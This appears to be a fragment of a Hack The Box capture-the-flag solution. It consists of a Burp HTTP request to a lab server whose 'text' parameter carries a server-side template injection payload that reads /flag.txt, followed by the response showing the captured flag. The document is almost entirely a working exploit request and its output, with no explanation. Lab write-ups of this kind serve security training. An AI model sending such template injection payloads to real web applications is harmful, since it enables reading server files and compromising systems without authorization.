
Request:

```burp
GET /?text=${open("/flag.txt").read()} HTTP/1.1
Host: 178.62.85.130:32356
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://178.62.85.130:32356/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

Response:
```
<tr>
        <td>HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}</td>
</tr>
```
